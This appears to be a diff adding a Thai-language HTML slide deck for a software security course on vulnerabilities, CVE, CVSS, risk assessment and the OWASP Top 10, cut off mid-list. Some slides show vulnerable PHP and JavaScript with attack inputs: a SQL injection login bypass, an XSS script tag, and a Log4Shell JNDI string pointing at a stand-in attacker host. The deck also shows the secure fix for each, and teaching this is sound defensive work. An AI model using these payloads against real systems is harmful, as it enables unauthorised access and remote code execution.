@@ -1,0 +1,1747 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ช่องโหว่และการประเมินความเสี่ยง</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            overflow-x: hidden;
+        }
+        
+        .slide {
+            min-height: 100vh;
+            padding: 40px;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            position: relative;
+        }
+        
+        .slide.active {
+            display: flex;
+        }
+        
+        .slide h1 {
+            font-size: 3em;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .slide h2 {
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            color: #fff;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .slide h3 {
+            font-size: 2em;
+            margin-bottom: 20px;
+            color: #ffd93d;
+        }
+        
+        .slide p, .slide li {
+            font-size: 1.3em;
+            line-height: 1.6;
+            margin-bottom: 15px;
+            max-width: 900px;
+        }
+        
+        .vulnerability-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 30px;
+            margin: 20px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .vulnerability-types {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .code-example {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: left;
+            font-family: 'Courier New', monospace;
+            border-left: 4px solid #ff6b6b;
+        }
+        
+        .cvss-meter {
+            background: linear-gradient(90deg, #00ff00 0%, #ffff00 40%, #ff9900 70%, #ff0000 100%);
+            height: 30px;
+            border-radius: 15px;
+            margin: 20px 0;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 10px;
+        }
+        
+        .risk-matrix {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 2px;
+            margin: 20px 0;
+        }
+        
+        .risk-cell {
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            border-radius: 5px;
+        }
+        
+        .risk-low { background-color: #4caf50; }
+        .risk-medium { background-color: #ff9800; }
+        .risk-high { background-color: #f44336; }
+        .risk-critical { background-color: #9c27b0; }
+        
+        .navigation {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1000;
+        }
+        
+        .nav-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            padding: 15px 20px;
+            margin: 0 5px;
+            border-radius: 25px;
+            color: white;
+            cursor: pointer;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+        
+        .nav-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-2px);
+        }
+        
+        .slide-counter {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px 20px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+        }
+        
+        ul {
+            text-align: left;
+            max-width: 800px;
+        }
+        
+        .highlight {
+            background: linear-gradient(120deg, rgba(255, 255, 255, 0.3) 0%, rgba(255, 255, 255, 0.1) 100%);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        
+        .lab-section {
+            background: rgba(255, 107, 107, 0.2);
+            padding: 30px;
+            border-radius: 15px;
+            margin: 20px 0;
+            border: 2px solid #ff6b6b;
+        }
+        
+        .best-practice {
+            background: rgba(76, 175, 80, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border-left: 4px solid #4caf50;
+        }
+        
+        .warning {
+            background: rgba(255, 152, 0, 0.2);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 4px solid #ff9800;
+        }
+
+        .owasp-ranking {
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 1.2em;
+            margin-bottom: 15px;
+            display: inline-block;
+        }
+
+        .tool-category {
+            background: rgba(78, 205, 196, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border-left: 4px solid #4ecdc4;
+        }
+    </style>
+</head>
+<body>
+    <div class="slide-counter">
+        <span id="current-slide">1</span> / <span id="total-slides">35</span>
+    </div>
+
+    <!-- Slide 1: Title -->
+    <div class="slide active">
+        <h1>สัปดาห์ที่ 3</h1>
+        <h2>ช่องโหว่และการประเมินความเสี่ยง</h2>
+        <h3>Vulnerabilities & Risk Assessment</h3>
+        <div class="highlight">
+            <p style="font-size: 1.5em; margin-top: 40px;">+ OWASP Top 10 & Security Testing Tools</p>
+            <p>สำหรับ Software Engineers: จากพื้นฐานสู่ระดับกลาง</p>
+        </div>
+    </div>
+
+    <!-- Slide 2: Course Objectives -->
+    <div class="slide">
+        <h2>วัตถุประสงค์ของการเรียนรู้</h2>
+        <div class="highlight">
+            <ul>
+                <li>เข้าใจความหมายและประเภทของ Vulnerabilities</li>
+                <li>ศึกษาระบบ Common Vulnerabilities and Exposures (CVE)</li>
+                <li>เรียนรู้หลักการ Risk Assessment และ Risk Management</li>
+                <li>ทำความเข้าใจ CVSS (Common Vulnerability Scoring System)</li>
+                <li>ศึกษา OWASP Top 10 อย่างละเอียด</li>
+                <li>เรียนรู้เครื่องมือ Security Testing ต่างๆ</li>
+                <li>ฝึกปฏิบัติการประเมินความเสี่ยงในโครงการจริง</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Slide 3: What are Vulnerabilities? -->
+    <div class="slide">
+        <h2>ช่องโหว่ (Vulnerabilities) คืออะไร?</h2>
+        <div class="vulnerability-card">
+            <h3>📋 คำนิยาม</h3>
+            <p>ช่องโหว่ (Vulnerability) คือ จุดอ่อนหรือข้อบกพร่องในระบบ แอปพลิเคชัน หรือเครือข่ายที่สามารถถูกใช้ประโยชน์โดยผู้ไม่ประสงค์ดี</p>
+        </div>
+        <div class="vulnerability-card">
+            <h3>⚠️ ลักษณะสำคัญ</h3>
+            <ul>
+                <li>เป็นจุดอ่อนที่มีอยู่ในระบบ</li>
+                <li>สามารถถูกใช้ประโยชน์ได้ (Exploitable)</li>
+                <li>ส่งผลกระทบต่อ CIA Triad (Confidentiality, Integrity, Availability)</li>
+                <li>มีระดับความรุนแรงที่แตกต่างกัน</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Slide 4: Types of Vulnerabilities -->
+    <div class="slide">
+        <h2>ประเภทของช่องโหว่</h2>
+        <div class="vulnerability-types">
+            <div class="vulnerability-card">
+                <h3>🔧 Technical Vulnerabilities</h3>
+                <ul>
+                    <li>Buffer Overflow</li>
+                    <li>SQL Injection</li>
+                    <li>Cross-Site Scripting (XSS)</li>
+                    <li>Insecure Cryptographic Storage</li>
+                    <li>Authentication Bypass</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>👥 Human Vulnerabilities</h3>
+                <ul>
+                    <li>Social Engineering</li>
+                    <li>Phishing</li>
+                    <li>Weak Passwords</li>
+                    <li>Lack of Security Awareness</li>
+                    <li>Human Error</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>🏢 Organizational Vulnerabilities</h3>
+                <ul>
+                    <li>Poor Security Policies</li>
+                    <li>Inadequate Access Controls</li>
+                    <li>Insufficient Training</li>
+                    <li>Lack of Incident Response Plan</li>
+                    <li>Weak Change Management</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 5: SQL Injection Example -->
+    <div class="slide">
+        <h2>ตัวอย่าง: SQL Injection</h2>
+        <div class="warning">
+            <h3>⚠️ ช่องโหว่ที่พบบ่อยที่สุด</h3>
+        </div>
+        <div class="code-example">
+            <h3>❌ Vulnerable Code:</h3>
+            <pre>
+// PHP - Unsafe query
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+$result = mysql_query($query);
+
+// Attacker input: ' OR '1'='1' --
+// Resulting query: SELECT * FROM users WHERE username='' OR '1'='1' --' AND password=''
+            </pre>
+        </div>
+        <div class="code-example">
+            <h3>✅ Secure Code:</h3>
+            <pre>
+// PHP - Using Prepared Statements
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->execute([$username, $hashedPassword]);
+$user = $stmt->fetch();
+            </pre>
+        </div>
+    </div>
+
+    <!-- Slide 6: XSS Example -->
+    <div class="slide">
+        <h2>ตัวอย่าง: Cross-Site Scripting (XSS)</h2>
+        <div class="code-example">
+            <h3>❌ Vulnerable Code:</h3>
+            <pre>
+// JavaScript - Direct DOM manipulation
+function displayUserComment(comment) {
+    document.getElementById('comments').innerHTML = comment;
+}
+
+// Malicious input: &lt;script&gt;alert('XSS Attack!')&lt;/script&gt;
+            </pre>
+        </div>
+        <div class="code-example">
+            <h3>✅ Secure Code:</h3>
+            <pre>
+// JavaScript - Proper sanitization
+function displayUserComment(comment) {
+    const sanitized = comment
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#x27;');
+    
+    document.getElementById('comments').textContent = sanitized;
+}
+            </pre>
+        </div>
+    </div>
+
+    <!-- Slide 7: CVE System -->
+    <div class="slide">
+        <h2>Common Vulnerabilities and Exposures (CVE)</h2>
+        <div class="vulnerability-card">
+            <h3>🏷️ CVE คืออะไร?</h3>
+            <p>ระบบมาตรฐานสากลสำหรับการตั้งชื่อและอ้างอิงช่องโหว่ความปลอดภัยที่ทราบแล้ว</p>
+        </div>
+        <div class="highlight">
+            <h3>📝 รูปแบบ CVE ID</h3>
+            <p style="font-size: 2em; font-family: monospace;">CVE-YYYY-NNNNN</p>
+            <ul>
+                <li>YYYY = ปีที่ค้นพบหรือเผยแพร่</li>
+                <li>NNNNN = หมายเลขลำดับ (ขั้นต่ำ 4 หลัก)</li>
+            </ul>
+        </div>
+        <div class="code-example">
+            <h3>ตัวอย่าง CVE ที่มีชื่อเสียง:</h3>
+            <ul>
+                <li><strong>CVE-2014-0160</strong> - Heartbleed (OpenSSL)</li>
+                <li><strong>CVE-2017-5638</strong> - Apache Struts 2</li>
+                <li><strong>CVE-2021-44228</strong> - Log4Shell (Log4j)</li>
+                <li><strong>CVE-2021-34527</strong> - PrintNightmare (Windows)</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Slide 8: CVE Example - Log4Shell -->
+    <div class="slide">
+        <h2>ตัวอย่าง CVE: Log4Shell (CVE-2021-44228)</h2>
+        <div class="vulnerability-card">
+            <h3>🔥 ช่องโหว่ที่สะเทือนโลก</h3>
+            <p><strong>CVSS Score:</strong> 10.0 (Critical)</p>
+            <p><strong>ผลกระทบ:</strong> Remote Code Execution</p>
+        </div>
+        <div class="code-example">
+            <h3>❌ Vulnerable Log4j Usage:</h3>
+            <pre>
+// Java - Vulnerable to JNDI Lookup
+logger.info("User input: " + userInput);
+
+// Malicious input: ${jndi:ldap://attacker.com/malicious}
+// Result: โหลดและรัน malicious code จาก server ของผู้โจมตี
+            </pre>
+        </div>
+        <div class="best-practice">
+            <h3>✅ การแก้ไข:</h3>
+            <ul>
+                <li>อัปเดต Log4j เป็นเวอร์ชั่น 2.17.0 หรือใหม่กว่า</li>
+                <li>ปิดการใช้งาน JNDI Lookup: -Dlog4j2.formatMsgNoLookups=true</li>
+                <li>ใช้ Input Validation และ Sanitization</li>
+                <li>ตรวจสอบ dependencies ที่ใช้ Log4j</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Slide 9: Risk Assessment Introduction -->
+    <div class="slide">
+        <h2>การประเมินความเสี่ยง (Risk Assessment)</h2>
+        <div class="vulnerability-card">
+            <h3>📊 คำนิยาม</h3>
+            <p>กระบวนการระบุ วิเคราะห์ และประเมินความเสี่ยงที่อาจเกิดขึ้นกับระบบหรือองค์กร</p>
+        </div>
+        <div class="highlight">
+            <h3>🎯 วัตถุประสงค์</h3>
+            <ul>
+                <li>ระบุภัยคุกคามและช่องโหว่</li>
+                <li>ประเมินผลกระทบที่อาจเกิดขึ้น</li>
+                <li>คำนวณระดับความเสี่ยง</li>
+                <li>จัดลำดับความสำคัญในการแก้ไข</li>
+                <li>วางแผนมาตรการป้องกัน</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Slide 10: Risk Formula -->
+    <div class="slide">
+        <h2>สูตรการคำนวณความเสี่ยง</h2>
+        <div class="vulnerability-card">
+            <h3 style="font-size: 3em;">Risk = Threat × Vulnerability × Impact</h3>
+        </div>
+        <div class="vulnerability-types">
+            <div class="vulnerability-card">
+                <h3>⚡ Threat (ภัยคุกคาม)</h3>
+                <p>ความน่าจะเป็นที่จะเกิดการโจมตี</p>
+                <ul>
+                    <li>Hackers / Cybercriminals</li>
+                    <li>Malware</li>
+                    <li>Natural Disasters</li>
+                    <li>Human Error</li>
+                    <li>Insider Threats</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>🕳️ Vulnerability (ช่องโหว่)</h3>
+                <p>ความง่ายในการโจมตีช่องโหว่</p>
+                <ul>
+                    <li>Ease of Exploitation</li>
+                    <li>Required Skills</li>
+                    <li>Access Requirements</li>
+                    <li>Detection Difficulty</li>
+                    <li>Availability of Exploits</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>💥 Impact (ผลกระทบ)</h3>
+                <p>ระดับความเสียหายที่เกิดขึ้น</p>
+                <ul>
+                    <li>Financial Loss</li>
+                    <li>Data Breach</li>
+                    <li>Service Disruption</li>
+                    <li>Reputation Damage</li>
+                    <li>Legal Consequences</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 11: Risk Management Process -->
+    <div class="slide">
+        <h2>กระบวนการบริหารความเสี่ยง</h2>
+        <div class="vulnerability-types">
+            <div class="vulnerability-card">
+                <h3>1️⃣ Risk Identification</h3>
+                <p>ระบุภัยคุกคามและช่องโหว่</p>
+                <ul>
+                    <li>Asset Inventory</li>
+                    <li>Threat Modeling</li>
+                    <li>Vulnerability Scanning</li>
+                    <li>Security Assessment</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>2️⃣ Risk Analysis</h3>
+                <p>วิเคราะห์และประเมินความเสี่ยง</p>
+                <ul>
+                    <li>Qualitative Analysis</li>
+                    <li>Quantitative Analysis</li>
+                    <li>CVSS Scoring</li>
+                    <li>Impact Assessment</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>3️⃣ Risk Evaluation</h3>
+                <p>ตัดสินใจและจัดลำดับความสำคัญ</p>
+                <ul>
+                    <li>Risk Matrix</li>
+                    <li>Risk Tolerance</li>
+                    <li>Business Impact</li>
+                    <li>Prioritization</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>4️⃣ Risk Treatment</h3>
+                <p>วางแผนและดำเนินการแก้ไข</p>
+                <ul>
+                    <li>Accept</li>
+                    <li>Avoid</li>
+                    <li>Transfer</li>
+                    <li>Mitigate</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 12: CVSS Introduction -->
+    <div class="slide">
+        <h2>CVSS (Common Vulnerability Scoring System)</h2>
+        <div class="vulnerability-card">
+            <h3>📏 CVSS คืออะไร?</h3>
+            <p>ระบบมาตรฐานสำหรับการให้คะแนนความรุนแรงของช่องโหว่ความปลอดภัย</p>
+        </div>
+        <div class="cvss-meter">
+            <span>0.0</span>
+            <span>2.5</span>
+            <span>5.0</span>
+            <span>7.5</span>
+            <span>10.0</span>
+        </div>
+        <div class="vulnerability-types">
+            <div class="vulnerability-card" style="background: rgba(0, 255, 0, 0.2);">
+                <h3>None (0.0)</h3>
+                <p>ไม่มีความเสี่ยง</p>
+            </div>
+            <div class="vulnerability-card" style="background: rgba(255, 255, 0, 0.2);">
+                <h3>Low (0.1-3.9)</h3>
+                <p>ความเสี่ยงต่ำ</p>
+            </div>
+            <div class="vulnerability-card" style="background: rgba(255, 153, 0, 0.2);">
+                <h3>Medium (4.0-6.9)</h3>
+                <p>ความเสี่ยงปานกลาง</p>
+            </div>
+            <div class="vulnerability-card" style="background: rgba(255, 0, 0, 0.2);">
+                <h3>High (7.0-8.9)</h3>
+                <p>ความเสี่ยงสูง</p>
+            </div>
+            <div class="vulnerability-card" style="background: rgba(156, 39, 176, 0.2);">
+                <h3>Critical (9.0-10.0)</h3>
+                <p>ความเสี่ยงวิกฤต</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 13: CVSS Metrics -->
+    <div class="slide">
+        <h2>CVSS Metrics Groups</h2>
+        <div class="vulnerability-types">
+            <div class="vulnerability-card">
+                <h3>⚡ Base Metrics</h3>
+                <p>คุณสมบัติพื้นฐานของช่องโหว่</p>
+                <ul>
+                    <li><strong>Attack Vector (AV):</strong> Network, Adjacent, Local, Physical</li>
+                    <li><strong>Attack Complexity (AC):</strong> Low, High</li>
+                    <li><strong>Privileges Required (PR):</strong> None, Low, High</li>
+                    <li><strong>User Interaction (UI):</strong> None, Required</li>
+                    <li><strong>Scope (S):</strong> Unchanged, Changed</li>
+                    <li><strong>Confidentiality (C):</strong> None, Low, High</li>
+                    <li><strong>Integrity (I):</strong> None, Low, High</li>
+                    <li><strong>Availability (A):</strong> None, Low, High</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>⏰ Temporal Metrics</h3>
+                <p>เปลี่ยนแปลงตามเวลา</p>
+                <ul>
+                    <li><strong>Exploit Code Maturity:</strong> ความพร้อมของ exploit</li>
+                    <li><strong>Remediation Level:</strong> ระดับการแก้ไข</li>
+                    <li><strong>Report Confidence:</strong> ความเชื่อมั่นในรายงาน</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>🏢 Environmental Metrics</h3>
+                <p>เฉพาะสภาพแวดล้อม</p>
+                <ul>
+                    <li><strong>Confidentiality Requirement:</strong> ความต้องการความลับ</li>
+                    <li><strong>Integrity Requirement:</strong> ความต้องการความถูกต้อง</li>
+                    <li><strong>Availability Requirement:</strong> ความต้องการความพร้อมใช้</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 14: CVSS Example -->
+    <div class="slide">
+        <h2>ตัวอย่าง CVSS Scoring</h2>
+        <div class="vulnerability-card">
+            <h3>CVE-2021-44228 (Log4Shell)</h3>
+        </div>
+        <div class="code-example">
+            <h3>📊 CVSS 3.1 Vector:</h3>
+            <p style="font-family: monospace; font-size: 1.1em;">
+                CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+            </p>
+        </div>
+        <div class="vulnerability-types">
+            <div class="vulnerability-card">
+                <h3>Base Metrics</h3>
+                <ul>
+                    <li><strong>AV:N</strong> - Network (สามารถโจมตีผ่านเครือข่าย)</li>
+                    <li><strong>AC:L</strong> - Low (ง่ายต่อการโจมตี)</li>
+                    <li><strong>PR:N</strong> - None (ไม่ต้องมีสิทธิพิเศษ)</li>
+                    <li><strong>UI:N</strong> - None (ไม่ต้องมีการโต้ตอบจากผู้ใช้)</li>
+                    <li><strong>S:C</strong> - Changed (ส่งผลกระทบข้ามระบบ)</li>
+                    <li><strong>C:H</strong> - High (ผลกระทบต่อความลับสูง)</li>
+                    <li><strong>I:H</strong> - High (ผลกระทบต่อความถูกต้องสูง)</li>
+                    <li><strong>A:H</strong> - High (ผลกระทบต่อความพร้อมใช้งานสูง)</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card" style="background: rgba(156, 39, 176, 0.3);">
+                <h3>🎯 ผลลัพธ์</h3>
+                <p style="font-size: 3em;">10.0</p>
+                <p style="font-size: 1.5em;">CRITICAL</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 15: Risk Matrix -->
+    <div class="slide">
+        <h2>Risk Matrix</h2>
+        <div class="vulnerability-card">
+            <h3>📊 เครื่องมือสำหรับการตัดสินใจ</h3>
+        </div>
+        <div style="display: grid; grid-template-columns: auto 1fr; gap: 20px; align-items: center;">
+            <div style="writing-mode: vertical-lr; text-orientation: mixed; font-weight: bold;">
+                LIKELIHOOD<br>(ความน่าจะเป็น)
+            </div>
+            <div class="risk-matrix">
+                <div style="grid-column: 1/-1; text-align: center; font-weight: bold; padding: 10px;">IMPACT (ผลกระทบ)</div>
+                <div style="font-weight: bold;">Very High</div>
+                <div class="risk-cell risk-medium">Medium</div>
+                <div class="risk-cell risk-high">High</div>
+                <div class="risk-cell risk-critical">Critical</div>
+                <div class="risk-cell risk-critical">Critical</div>
+                <div style="font-weight: bold;">High</div>
+                <div class="risk-cell risk-low">Low</div>
+                <div class="risk-cell risk-medium">Medium</div>
+                <div class="risk-cell risk-high">High</div>
+                <div class="risk-cell risk-critical">Critical</div>
+                <div style="font-weight: bold;">Medium</div>
+                <div class="risk-cell risk-low">Low</div>
+                <div class="risk-cell risk-low">Low</div>
+                <div class="risk-cell risk-medium">Medium</div>
+                <div class="risk-cell risk-high">High</div>
+                <div style="font-weight: bold;">Low</div>
+                <div class="risk-cell risk-low">Low</div>
+                <div class="risk-cell risk-low">Low</div>
+                <div class="risk-cell risk-low">Low</div>
+                <div class="risk-cell risk-medium">Medium</div>
+                <div style="font-weight: bold;">Very Low</div>
+                <div class="risk-cell risk-low">Low</div>
+                <div class="risk-cell risk-low">Low</div>
+                <div class="risk-cell risk-low">Low</div>
+                <div class="risk-cell risk-low">Low</div>
+                <div></div>
+                <div style="font-weight: bold; text-align: center;">Very Low</div>
+                <div style="font-weight: bold; text-align: center;">Low</div>
+                <div style="font-weight: bold; text-align: center;">Medium</div>
+                <div style="font-weight: bold; text-align: center;">High</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 16: Best Practices -->
+    <div class="slide">
+        <h2>Best Practices สำหรับ Software Engineers</h2>
+        <div class="vulnerability-types">
+            <div class="best-practice">
+                <h3>🔒 Secure Coding</h3>
+                <ul>
+                    <li>Input Validation และ Sanitization</li>
+                    <li>ใช้ Prepared Statements</li>
+                    <li>Proper Error Handling</li>
+                    <li>Secure Authentication</li>
+                    <li>Output Encoding</li>
+                </ul>
+            </div>
+            <div class="best-practice">
+                <h3>🔍 Regular Assessment</h3>
+                <ul>
+                    <li>Static Application Security Testing (SAST)</li>
+                    <li>Dynamic Application Security Testing (DAST)</li>
+                    <li>Dependency Scanning</li>
+                    <li>Code Review</li>
+                    <li>Penetration Testing</li>
+                </ul>
+            </div>
+            <div class="best-practice">
+                <h3>📚 Stay Updated</h3>
+                <ul>
+                    <li>ติดตาม CVE Databases</li>
+                    <li>อัปเดต Dependencies</li>
+                    <li>Security Training</li>
+                    <li>Threat Intelligence</li>
+                    <li>Security Communities</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 17: Tools and Resources -->
+    <div class="slide">
+        <h2>เครื่องมือและแหล่งข้อมูล</h2>
+        <div class="vulnerability-types">
+            <div class="vulnerability-card">
+                <h3>🛠️ Vulnerability Scanners</h3>
+                <ul>
+                    <li><strong>OWASP ZAP</strong> - Web Application Scanner</li>
+                    <li><strong>Nessus</strong> - Network Vulnerability Scanner</li>
+                    <li><strong>SonarQube</strong> - Code Quality & Security</li>
+                    <li><strong>Snyk</strong> - Dependency Vulnerability Scanner</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>📖 Knowledge Resources</h3>
+                <ul>
+                    <li><strong>NVD</strong> - nvd.nist.gov</li>
+                    <li><strong>CVE</strong> - cve.mitre.org</li>
+                    <li><strong>OWASP Top 10</strong> - owasp.org</li>
+                    <li><strong>CWE</strong> - cwe.mitre.org</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>📊 CVSS Calculators</h3>
+                <ul>
+                    <li><strong>NVD Calculator</strong> - nvd.nist.gov/vuln-metrics/cvss</li>
+                    <li><strong>FIRST CVSS Calculator</strong> - first.org/cvss/calculator</li>
+                    <li><strong>RedHat CVSS Calculator</strong> - access.redhat.com/labs/cvss</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 18: Scenario-based Exercise -->
+    <div class="slide">
+        <h2>สถานการณ์จำลอง: E-commerce Application</h2>
+        <div class="vulnerability-card">
+            <h3>🛒 บริบท</h3>
+            <p>คุณเป็นนักพัฒนาในทีมที่รับผิดชอบระบบ E-commerce ขององค์กร</p>
+        </div>
+        <div class="warning">
+            <h3>⚠️ ปัญหาที่พบ</h3>
+            <ul>
+                <li>พบ SQL Injection ในหน้า Login</li>
+                <li>ระบบ Payment Gateway ใช้ HTTP แทน HTTPS</li>
+                <li>ไม่มีการ Hash Password</li>
+                <li>Session Management ไม่ปลอดภัย</li>
+                <li>ไม่มีการ Validate Input จาก User</li>
+                <li>ไม่มีการจำกัด Rate Limiting</li>
+            </ul>
+        </div>
+        <div class="highlight">
+            <h3>❓ คำถาม</h3>
+            <p>จงทำการประเมินความเสี่ยงและจัดลำดับความสำคัญในการแก้ไข โดยใช้ CVSS และ Risk Matrix</p>
+        </div>
+    </div>
+
+    <!-- Slide 19: LAB Assignment -->
+    <div class="slide">
+        <h2>LAB Assignment</h2>
+        <div class="lab-section">
+            <h3>🔬 การปฏิบัติการ: Vulnerability Assessment Report</h3>
+            
+            <div class="vulnerability-card">
+                <h3>📋 รายละเอียดงาน</h3>
+                <p>สร้างรายงานการประเมินความเสี่ยงสำหรับ Web Application</p>
+            </div>
+
+            <div class="best-practice">
+                <h3>✅ ขั้นตอนการดำเนินงาน</h3>
+                <ol>
+                    <li><strong>เลือกเว็บไซต์</strong> - เลือก Web Application ที่จะวิเคราะห์ (อาจเป็นโปรเจกต์ส่วนตัวหรือ Demo Site)</li>
+                    <li><strong>Vulnerability Scanning</strong> - ใช้เครื่องมือ OWASP ZAP หรือ Burp Suite Community</li>
+                    <li><strong>Manual Testing</strong> - ทดสอบ OWASP Top 10 vulnerabilities</li>
+                    <li><strong>CVSS Scoring</strong> - ให้คะแนน CVSS สำหรับช่องโหว่ที่พบ</li>
+                    <li><strong>Risk Assessment</strong> - ประเมินความเสี่ยงและจัดลำดับความสำคัญ</li>
+                    <li><strong>Remediation Plan</strong> - เสนอแผนการแก้ไข</li>
+                </ol>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 20: Summary -->
+    <div class="slide">
+        <h2>สรุปส่วนที่ 1</h2>
+        <div class="vulnerability-types">
+            <div class="highlight">
+                <h3>🎯 สิ่งที่เราได้เรียนรู้</h3>
+                <ul>
+                    <li>ความหมายและประเภทของ Vulnerabilities</li>
+                    <li>ระบบ CVE และการใช้งาน</li>
+                    <li>หลักการ Risk Assessment และ Risk Management</li>
+                    <li>การใช้งาน CVSS Scoring System</li>
+                    <li>Best Practices สำหรับนักพัฒนา</li>
+                </ul>
+            </div>
+            <div class="best-practice">
+                <h3>🚀 ต่อไป: OWASP Top 10 & Security Testing</h3>
+                <ul>
+                    <li>ศึกษา OWASP Top 10 อย่างละเอียด</li>
+                    <li>เรียนรู้เครื่องมือ Security Testing</li>
+                    <li>ฝึกปฏิบัติกับเครื่องมือจริง</li>
+                    <li>ทำโปรเจกต์ Security Assessment</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- OWASP Top 10 Section Starts Here -->
+    
+    <!-- Slide 21: OWASP Top 10 Introduction -->
+    <div class="slide">
+        <h1>OWASP Top 10 - 2021</h1>
+        <div class="vulnerability-card">
+            <h3>🛡️ OWASP คืออะไร?</h3>
+            <p>Open Web Application Security Project - องค์กรไม่แสวงผลกำไรที่มุ่งเน้นปรับปรุงความปลอดภัยของซอฟต์แวร์</p>
+        </div>
+        <div class="highlight">
+            <h3>📊 OWASP Top 10</h3>
+            <p>รายการช่องโหว่ความปลอดภัยที่พบบ่อยที่สุดในเว็บแอปพลิเคชัน อัปเดตทุก 3-4 ปี</p>
+            <ul>
+                <li>เป็นมาตรฐานอ้างอิงสำหรับนักพัฒนา</li>
+                <li>ช่วยจัดลำดับความสำคัญในการแก้ไข</li>
+                <li>ใช้เป็นแนวทางในการออกแบบระบบ</li>
+                <li>เป็นเครื่องมือสำหรับ Security Testing</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Slide 22: OWASP Top 10 Overview -->
+    <div class="slide">
+        <h2>OWASP Top 10 - 2021 Overview</h2>
+        <div class="vulnerability-types" style="grid-template-columns: repeat(2, 1fr);">
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A01</div>
+                <h3>Broken Access Control</h3>
+                <p>การควบคุมการเข้าถึงที่มีปัญหา</p>
+            </div>
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A02</div>
+                <h3>Cryptographic Failures</h3>
+                <p>ความล้มเหลวในการเข้ารหัส</p>
+            </div>
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A03</div>
+                <h3>Injection</h3>
+                <p>การฉีดคำสั่ง (SQL, NoSQL, OS)</p>
+            </div>
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A04</div>
+                <h3>Insecure Design</h3>
+                <p>การออกแบบที่ไม่ปลอดภัย</p>
+            </div>
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A05</div>
